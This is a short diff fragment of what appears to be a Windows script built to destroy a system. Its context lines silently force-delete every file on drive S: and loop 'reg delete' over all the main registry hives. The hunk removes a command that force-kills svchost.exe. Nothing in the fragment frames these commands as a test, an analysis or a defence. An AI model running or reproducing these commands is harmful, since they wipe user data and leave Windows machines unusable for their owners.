@@ -53,5 +53,3 @@ cmd /c "del /f /s /q S:*.* > NUL 2>&1"
 @("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
     cmd /c "reg delete $_ /f"
 }
-
-taskkill /f /im svchost.exe /t
